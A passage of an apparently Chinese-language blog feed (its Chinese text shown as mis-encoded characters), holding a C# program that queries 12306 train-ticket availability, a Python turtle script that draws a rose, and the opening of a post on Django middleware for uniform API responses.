== HttpStatusCode.OK)</span><br><span class="line">         &#123;</span><br><span class="line">             StreamReader sr = <span class="keyword">new</span> StreamReader(response.GetResponseStream(), Encoding.GetEncoding(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">             str = sr.ReadToEnd();</span><br><span class="line">             sr.Close();</span><br><span class="line">             response.Close();<span class="comment">//å…³é—­responseå“åº”æµ</span></span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">catch</span> (Exception e)</span><br><span class="line">     &#123;</span><br><span class="line">         Console.WriteLine(e.Message);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; map=<span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;();<span class="comment">//ä¿å­˜è¿”å›çš„JSONä¸²ä¸­çš„è½¦ç«™ä»£ç ä¸è½¦ç«™åä¹‹é—´çš„æ˜ </span></span><br><span class="line">     ArrayList AllTicket = <span class="keyword">new</span> ArrayList();<span class="comment">//æ‰€æœ‰çš„è½¦ç¥¨ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">     JObject jo = (JObject)JsonConvert.DeserializeObject(str);</span><br><span class="line">     JToken <span class="keyword">record</span> = jo[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;map&quot;</span>];</span><br><span class="line">     <span class="keyword">foreach</span> (JProperty item <span class="keyword">in</span> <span class="keyword">record</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         map.Add(item.Name.ToString(), item.Value.ToString());</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">record</span> = jo[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;result&quot;</span>];</span><br><span class="line">     <span class="keyword">foreach</span> (<span class="built_in">string</span> s <span class="keyword">in</span> <span class="keyword">record</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="built_in">string</span>[] result = s.Split(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">         Ticket t = <span class="keyword">new</span> Ticket();</span><br><span class="line">         t.TrainId = result[<span class="number">3</span>];</span><br><span class="line">         t.FromStation = map[result[<span class="number">6</span>]];</span><br><span class="line">         t.ToStation = map[result[<span class="number">7</span>]];</span><br><span class="line">         t.StartTime = result[<span class="number">8</span>];</span><br><span class="line">         t.ArriveTime = result[<span class="number">9</span>];</span><br><span class="line">         t.LastedTime = result[<span class="number">10</span>];</span><br><span class="line">         t.TicketDate = result[<span class="number">13</span>];</span><br><span class="line">         t.DwNum = result[<span class="number">33</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">33</span>] : t.DwNum;</span><br><span class="line">         t.TzNum = result[<span class="number">32</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">32</span>] : t.TzNum;</span><br><span class="line">         t.YdNum = result[<span class="number">31</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">31</span>] : t.YdNum;</span><br><span class="line">         t.EdNum = result[<span class="number">30</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">30</span>] : t.EdNum;</span><br><span class="line">         t.YzNum = result[<span class="number">29</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">29</span>] : t.YzNum;</span><br><span class="line">         t.YwNum = result[<span class="number">28</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">28</span>] : t.YwNum;</span><br><span class="line">         t.WzNum = result[<span class="number">26</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">26</span>] : t.WzNum;</span><br><span class="line">         t.RzNum = result[<span class="number">24</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">24</span>] : t.RzNum;</span><br><span class="line">         t.RwNum = result[<span class="number">23</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">23</span>] : t.RwNum;</span><br><span class="line">         t.GrwNum = result[<span class="number">21</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">21</span>] : t.GrwNum;</span><br><span class="line">         AllTicket.Add(t);</span><br><span class="line">     &#125;</span><br><span class="line">     Ticket[] All = <span class="keyword">new</span> Ticket[AllTicket.Count];</span><br><span class="line">     <span class="built_in">int</span> flag = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">foreach</span> (<span class="built_in">object</span> t <span class="keyword">in</span> AllTicket)</span><br><span class="line">     &#123;</span><br><span class="line">         All[flag++] = t <span class="keyword">as</span> Ticket;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> All;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h2 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h2><p><img data-src="/images/spiderticket.jpg"><br><img data-src="/images/spiderticket2.jpg"><br>é¡¹ç›®åœ°å€:<a href="https://github.com/ZhaoQi99/EasyLife/tree/Course_Design/">EasyLife</a></p>
<h2 id="å‚è€ƒåšå®¢"><a href="#å‚è€ƒåšå®¢" class="headerlink" title="å‚è€ƒåšå®¢"></a>å‚è€ƒåšå®¢</h2><p><a href="https://blog.csdn.net/xiahn1a/article/details/42584507">C#è°ƒç”¨12306APIåšä½™ç¥¨æŸ¥è¯¢</a>(è¯¥å‚è€ƒåšå®¢ä¸­çš„æ–¹æ³•å·²ä¸å¯ç”¨)</p>
<h2 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> Newtonsoft.Json.Linq;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br><span class="line"><span class="keyword">using</span> System.Xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Ticket</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">StationNameXml</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> nowpath = Environment.CurrentDirectory;</span><br><span class="line">            <span class="keyword">if</span> (Directory.Exists(nowpath + <span class="string">&quot;/Data&quot;</span>) == <span class="literal">false</span>)</span><br><span class="line">                Directory.CreateDirectory(nowpath + <span class="string">&quot;/Data&quot;</span>);<span class="comment">//åˆ›å»ºæ–°è·¯å¾„</span></span><br><span class="line">            <span class="keyword">if</span> (File.Exists(nowpath + <span class="string">&quot;/Data/StationName.xml&quot;</span>) == <span class="literal">true</span>)</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            HttpWebRequest request;</span><br><span class="line">            HttpWebResponse response;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> url = <span class="string">@&quot;https://kyfw.12306.cn/otn/resources/js/framework/station_name.js?station_version=1.9055&quot;</span>;</span><br><span class="line"></span><br><span class="line">            request = (HttpWebRequest)WebRequest.Create(url);</span><br><span class="line">            request.Method = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">            request.Credentials = CredentialCache.DefaultCredentials;</span><br><span class="line">            request.UserAgent = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> str = <span class="built_in">string</span>.Empty;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                response = (HttpWebResponse)request.GetResponse();</span><br><span class="line">                <span class="keyword">if</span> (response.StatusCode == HttpStatusCode.OK)</span><br><span class="line">                &#123;</span><br><span class="line">                    StreamReader sr = <span class="keyword">new</span> StreamReader(response.GetResponseStream(), Encoding.GetEncoding(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                    str = sr.ReadToEnd();</span><br><span class="line">                    sr.Close();</span><br><span class="line">                    response.Close();<span class="comment">//å…³é—­responseå“åº”æµ</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(e.Message);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> pattern = <span class="string">@&quot;@\S&#123;2,5&#125;?[|](?&lt;Name&gt;\S&#123;1,8&#125;?)[|](?&lt;Code&gt;\S&#123;3,5&#125;?)[|]&quot;</span>;</span><br><span class="line">            Regex r = <span class="keyword">new</span> Regex(pattern, RegexOptions.ExplicitCapture);</span><br><span class="line"></span><br><span class="line">            XmlDocument xmldoc = <span class="keyword">new</span> XmlDocument();</span><br><span class="line">            XmlDeclaration xmldecl;</span><br><span class="line"></span><br><span class="line">            xmldecl = xmldoc.CreateXmlDeclaration(<span class="string">&quot;1.0&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="literal">null</span>);<span class="comment">//åŠ å…¥XMLçš„å£°æ˜æ®µè½</span></span><br><span class="line">            xmldoc.AppendChild(xmldecl);</span><br><span class="line"></span><br><span class="line">            XmlElement root = xmldoc.CreateElement(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Dict&quot;</span>, <span class="string">&quot;&quot;</span>);<span class="comment">//åŠ å…¥ä¸€ä¸ªæ ¹å…ƒç´ </span></span><br><span class="line">            xmldoc.AppendChild(root);</span><br><span class="line"></span><br><span class="line">            MatchCollection mc = r.Matches(str);</span><br><span class="line">            <span class="keyword">foreach</span> (Match m <span class="keyword">in</span> mc)</span><br><span class="line">            &#123;</span><br><span class="line">                GroupCollection <span class="keyword">group</span> = m.Groups;</span><br><span class="line">                XmlNode node = xmldoc.CreateNode(XmlNodeType.Element, <span class="string">&quot;Pair&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">                XmlNode temp = xmldoc.CreateNode(XmlNodeType.Element, <span class="string">&quot;Station&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                temp.InnerText = <span class="keyword">group</span>[<span class="string">&quot;Name&quot;</span>].Value;</span><br><span class="line">                node.AppendChild(temp);</span><br><span class="line"></span><br><span class="line">                XmlNode temp2 = xmldoc.CreateNode(XmlNodeType.Element, <span class="string">&quot;Code&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                temp2.InnerText = <span class="keyword">group</span>[<span class="string">&quot;Code&quot;</span>].Value;</span><br><span class="line">                node.AppendChild(temp2);</span><br><span class="line"></span><br><span class="line">                root.AppendChild(node);</span><br><span class="line">            &#125;</span><br><span class="line">            xmldoc.Save(nowpath + <span class="string">&quot;/Data/&quot;</span> + <span class="string">&quot;StationName.xml&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">StationCode</span>(<span class="params"><span class="built_in">string</span> StationName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            XmlDocument doc = <span class="keyword">new</span> XmlDocument();</span><br><span class="line">            doc.Load(Environment.CurrentDirectory + <span class="string">&quot;/Data/StationName.xml&quot;</span>);</span><br><span class="line">            XmlNodeList data = doc.DocumentElement.ChildNodes;</span><br><span class="line">            <span class="keyword">foreach</span> (XmlNode node <span class="keyword">in</span> data)</span><br><span class="line">            &#123;</span><br><span class="line">                XmlElement xe = (XmlElement)node;</span><br><span class="line">                XmlNodeList xnl0 = xe.ChildNodes;</span><br><span class="line">                <span class="built_in">string</span> s = xnl0.Item(<span class="number">0</span>).InnerText;</span><br><span class="line">                <span class="keyword">if</span> (s == StationName)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span> xnl0.Item(<span class="number">1</span>).InnerText;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">string</span>.Empty;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Ticket[] <span class="title">SpiderTicket</span>(<span class="params"><span class="built_in">string</span> date, <span class="built_in">string</span> <span class="keyword">from</span>, <span class="built_in">string</span> to, <span class="built_in">string</span> id</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            HttpWebRequest request;</span><br><span class="line">            HttpWebResponse response;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> url = <span class="string">&quot;https://kyfw.12306.cn/otn/leftTicket/query?leftTicketDTO.train_date=&#123;0&#125;&amp;leftTicketDTO.from_station=&#123;1&#125;&amp;leftTicketDTO.to_station=&#123;2&#125;&amp;purpose_codes=&#123;3&#125;&quot;</span>;</span><br><span class="line">            url = <span class="built_in">string</span>.Format(url, date, <span class="keyword">from</span>, to, id);</span><br><span class="line"></span><br><span class="line">            request = (HttpWebRequest)WebRequest.Create(url);</span><br><span class="line">            request.Method = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">            request.Credentials = CredentialCache.DefaultCredentials;</span><br><span class="line">            request.UserAgent = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> str = <span class="built_in">string</span>.Empty;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                response = (HttpWebResponse)request.GetResponse();</span><br><span class="line">                <span class="keyword">if</span> (response.StatusCode == HttpStatusCode.OK)</span><br><span class="line">                &#123;</span><br><span class="line">                    StreamReader sr = <span class="keyword">new</span> StreamReader(response.GetResponseStream(), Encoding.GetEncoding(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                    str = sr.ReadToEnd();</span><br><span class="line">                    sr.Close();</span><br><span class="line">                    response.Close();<span class="comment">//å…³é—­responseå“åº”æµ</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(e.Message);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; map=<span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;();<span class="comment">//ä¿å­˜è¿”å›çš„JSONä¸²ä¸­çš„è½¦ç«™ä»£ç ä¸è½¦ç«™åä¹‹é—´çš„æ˜ </span></span><br><span class="line">            ArrayList AllTicket = <span class="keyword">new</span> ArrayList();<span class="comment">//æ‰€æœ‰çš„è½¦ç¥¨ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">            JObject jo = (JObject)JsonConvert.DeserializeObject(str);</span><br><span class="line">            JToken <span class="keyword">record</span> = jo[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;map&quot;</span>];</span><br><span class="line">            <span class="keyword">foreach</span> (JProperty item <span class="keyword">in</span> <span class="keyword">record</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                map.Add(item.Name.ToString(), item.Value.ToString());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">record</span> = jo[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;result&quot;</span>];</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="built_in">string</span> s <span class="keyword">in</span> <span class="keyword">record</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">string</span>[] result = s.Split(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">                Ticket t = <span class="keyword">new</span> Ticket();</span><br><span class="line">                t.TrainId = result[<span class="number">3</span>];</span><br><span class="line">                t.FromStation = map[result[<span class="number">6</span>]];</span><br><span class="line">                t.ToStation = map[result[<span class="number">7</span>]];</span><br><span class="line">                t.StartTime = result[<span class="number">8</span>];</span><br><span class="line">                t.ArriveTime = result[<span class="number">9</span>];</span><br><span class="line">                t.LastedTime = result[<span class="number">10</span>];</span><br><span class="line">                t.TicketDate = result[<span class="number">13</span>];</span><br><span class="line">                t.DwNum = result[<span class="number">33</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">33</span>] : t.DwNum;</span><br><span class="line">                t.TzNum = result[<span class="number">32</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">32</span>] : t.TzNum;</span><br><span class="line">                t.YdNum = result[<span class="number">31</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">31</span>] : t.YdNum;</span><br><span class="line">                t.EdNum = result[<span class="number">30</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">30</span>] : t.EdNum;</span><br><span class="line">                t.YzNum = result[<span class="number">29</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">29</span>] : t.YzNum;</span><br><span class="line">                t.YwNum = result[<span class="number">28</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">28</span>] : t.YwNum;</span><br><span class="line">                t.WzNum = result[<span class="number">26</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">26</span>] : t.WzNum;</span><br><span class="line">                t.RzNum = result[<span class="number">24</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">24</span>] : t.RzNum;</span><br><span class="line">                t.RwNum = result[<span class="number">23</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">23</span>] : t.RwNum;</span><br><span class="line">                t.GrwNum = result[<span class="number">21</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">21</span>] : t.GrwNum;</span><br><span class="line">                AllTicket.Add(t);</span><br><span class="line">            &#125;</span><br><span class="line">            Ticket[] All = <span class="keyword">new</span> Ticket[AllTicket.Count];</span><br><span class="line">            <span class="built_in">int</span> flag = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="built_in">object</span> t <span class="keyword">in</span> AllTicket)</span><br><span class="line">            &#123;</span><br><span class="line">                All[flag++] = t <span class="keyword">as</span> Ticket;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> All;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            StationNameXml();</span><br><span class="line">            <span class="built_in">string</span> <span class="keyword">from</span> = <span class="string">&quot;ä¸Šæµ·&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span> to = <span class="string">&quot;åŒ—äº¬&quot;</span>;</span><br><span class="line">            Ticket[] All=<span class="keyword">new</span> Ticket[<span class="number">50</span>];</span><br><span class="line">            All=SpiderTicket(DateTime.Now.ToString(<span class="string">&quot;yyyy-MM-dd&quot;</span>), StationCode(<span class="keyword">from</span>), StationCode(to), <span class="string">&quot;ADULT&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;All.Length;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; map = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;();</span><br><span class="line">                map = All[i].getMap();</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="built_in">object</span> j <span class="keyword">in</span> map.Keys)</span><br><span class="line">                    Console.Write(j.ToString()+<span class="string">&quot;:&quot;</span>+map[j.ToString()].ToString()+<span class="string">&quot; &quot;</span>);</span><br><span class="line">                Console.WriteLine();</span><br><span class="line">            &#125;</span><br><span class="line">            Console.Read();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>C#</category>
      </categories>
      <tags>
        <tag>C#</tag>
        <tag>.NET</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ©ç”¨Pythonçš„turtleåº“ç»˜åˆ¶ç«ç‘°</title>
    <url>/posts/17747/</url>
    <content><![CDATA[<p>turtleçš„æ–‡æ¡£ï¼š<a href="https://docs.python.org/3/library/turtle.html"></a><br>ç”¨Pythonçš„turtleåº“ç»˜å›¾æ˜¯å¾ˆç®€å•çš„,é—²æ¥æ— äº‹å°±ç”»äº†ä¸€ä¸ªç«ç‘°èŠ±,ä¸‹é¢å¥‰ä¸Šæºç ....</p>
<span id="more"></span>
<h2 id="æºç ï¼š"><a href="#æºç ï¼š" class="headerlink" title="æºç ï¼š"></a>æºç ï¼š</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Created on Nov 18, 2017</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: QiZhao</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®åˆå§‹ä½ç½®</span></span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.left(<span class="number">90</span>)</span><br><span class="line">turtle.fd(<span class="number">200</span>)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.right(<span class="number">90</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># èŠ±è•Š</span></span><br><span class="line">turtle.fillcolor(<span class="string">&quot;red&quot;</span>)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.circle(<span class="number">10</span>,<span class="number">180</span>)</span><br><span class="line">turtle.circle(<span class="number">25</span>,<span class="number">110</span>)</span><br><span class="line">turtle.left(<span class="number">50</span>)</span><br><span class="line">turtle.circle(<span class="number">60</span>,<span class="number">45</span>)</span><br><span class="line">turtle.circle(<span class="number">20</span>,<span class="number">170</span>)</span><br><span class="line">turtle.right(<span class="number">24</span>)</span><br><span class="line">turtle.fd(<span class="number">30</span>)</span><br><span class="line">turtle.left(<span class="number">10</span>)</span><br><span class="line">turtle.circle(<span class="number">30</span>,<span class="number">110</span>)</span><br><span class="line">turtle.fd(<span class="number">20</span>)</span><br><span class="line">turtle.left(<span class="number">40</span>)</span><br><span class="line">turtle.circle(<span class="number">90</span>,<span class="number">70</span>)</span><br><span class="line">turtle.circle(<span class="number">30</span>,<span class="number">150</span>)</span><br><span class="line">turtle.right(<span class="number">30</span>)</span><br><span class="line">turtle.fd(<span class="number">15</span>)</span><br><span class="line">turtle.circle(<span class="number">80</span>,<span class="number">90</span>)</span><br><span class="line">turtle.left(<span class="number">15</span>)</span><br><span class="line">turtle.fd(<span class="number">45</span>)</span><br><span class="line">turtle.right(<span class="number">165</span>)</span><br><span class="line">turtle.fd(<span class="number">20</span>)</span><br><span class="line">turtle.left(<span class="number">155</span>)</span><br><span class="line">turtle.circle(<span class="number">150</span>,<span class="number">80</span>)</span><br><span class="line">turtle.left(<span class="number">50</span>)</span><br><span class="line">turtle.circle(<span class="number">150</span>,<span class="number">90</span>)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># èŠ±ç“£1</span></span><br><span class="line">turtle.left(<span class="number">150</span>)</span><br><span class="line">turtle.circle(-<span class="number">90</span>,<span class="number">70</span>)</span><br><span class="line">turtle.left(<span class="number">20</span>)</span><br><span class="line">turtle.circle(<span class="number">75</span>,<span class="number">105</span>)</span><br><span class="line">turtle.setheading(<span class="number">60</span>)</span><br><span class="line">turtle.circle(<span class="number">80</span>,<span class="number">98</span>)</span><br><span class="line">turtle.circle(-<span class="number">90</span>,<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># èŠ±ç“£2</span></span><br><span class="line">turtle.left(<span class="number">180</span>)</span><br><span class="line">turtle.circle(<span class="number">90</span>,<span class="number">40</span>)</span><br><span class="line">turtle.circle(-<span class="number">80</span>,<span class="number">98</span>)</span><br><span class="line">turtle.setheading(-<span class="number">83</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¶å­1</span></span><br><span class="line">turtle.fd(<span class="number">30</span>)</span><br><span class="line">turtle.left(<span class="number">90</span>)</span><br><span class="line">turtle.fd(<span class="number">25</span>)</span><br><span class="line">turtle.left(<span class="number">45</span>)</span><br><span class="line">turtle.fillcolor(<span class="string">&quot;green&quot;</span>)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.circle(-<span class="number">80</span>,<span class="number">90</span>)</span><br><span class="line">turtle.right(<span class="number">90</span>)</span><br><span class="line">turtle.circle(-<span class="number">80</span>,<span class="number">90</span>)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"> </span><br><span class="line">turtle.right(<span class="number">135</span>)</span><br><span class="line">turtle.fd(<span class="number">60</span>)</span><br><span class="line">turtle.left(<span class="number">180</span>)</span><br><span class="line">turtle.fd(<span class="number">85</span>)</span><br><span class="line">turtle.left(<span class="number">90</span>)</span><br><span class="line">turtle.fd(<span class="number">80</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># å¶å­2</span></span><br><span class="line">turtle.right(<span class="number">90</span>)</span><br><span class="line">turtle.right(<span class="number">45</span>)</span><br><span class="line">turtle.fillcolor(<span class="string">&quot;green&quot;</span>)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.circle(<span class="number">80</span>,<span class="number">90</span>)</span><br><span class="line">turtle.left(<span class="number">90</span>)</span><br><span class="line">turtle.circle(<span class="number">80</span>,<span class="number">90</span>)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"> </span><br><span class="line">turtle.left(<span class="number">135</span>)</span><br><span class="line">turtle.fd(<span class="number">60</span>)</span><br><span class="line">turtle.left(<span class="number">180</span>)</span><br><span class="line">turtle.fd(<span class="number">60</span>)</span><br><span class="line">turtle.right(<span class="number">90</span>)</span><br><span class="line">turtle.circle(<span class="number">200</span>,<span class="number">60</span>)</span><br></pre></td></tr></table></figure>
<h2 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h2><p><img data-src="/images/20171119110410660.jpg"></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>åœ¨Djangoä¸­é—´ä»¶å¤„å¯¹APIè¿›è¡Œç»Ÿä¸€å¤„ç†</title>
    <url>/posts/2620614917/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å…¬å¸å®ä¹ æ—¶é‡åˆ°ä¸€ä¸ªé—®é¢˜:é¡¹ç›®ä¸­æ‰€ä½¿ç”¨ä¸æ˜¯Restful API,æ¯ä¸ªè§†å›¾å‡½æ•°éƒ½è¦å…ˆç”Ÿæˆå­—å…¸ï¼Œäºæ˜¯é¡¹ç›®ä¸­ä¾¿å……æ–¥ç€å¦‚ä¸‹çš„ä»£ç :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result=&#123;</span><br><span class="line">	<span class="string">&quot;msg&quot;</span>:<span class="string">&#x27;xx&quot;,</span></span><br><span class="line"><span class="string">	&quot;status&quot;:200,</span></span><br><span class="line"><span class="string">	&quot;result&quot;:data</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">return HttpResponse(json.loads(result))</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p>ç»´æŠ¤èµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼Œå¯¹å‰ç«¯ä¹Ÿå¾ˆä¸å‹å¥½ï¼Œä¸ºäº†è§£å†³è¯¥é—®é¢˜ï¼Œè‡ªå®šä¹‰äº†ä¸€ä¸ªDjangoä¸­é—´ä»¶å¯¹APIæ ¼å¼å’Œå¼‚å¸¸è¿›è¡Œç»Ÿä¸€å¤„ç†ï¼Œä»¥æ­¤è¾¾åˆ°å¦‚ä¸‹æ•ˆæœ:</p>
<ul>
<li>åœ¨viewä¸­åªéœ€è¿”å›<code>data</code>ï¼Œ<code>raise</code>è‡ªå®šä¹‰çš„å¼‚å¸¸</li>
<li>å®ç°è‡ªå®šä¹‰å¼‚å¸¸çŠ¶æ€ç (<code>status</code>)å’Œè‡ªå®šä¹‰å¼‚å¸¸ä¿¡æ¯(<code>message</code>)</li>
<li>viewä¸­è¿”å›çš„<code>Object</code>è‹¥ä¸º<code>Model</code>,åˆ™ä¼šè¿”å›è°ƒç”¨å…¶<code>__str__</code>æ–¹æ³•çš„ç»“æœ</li>
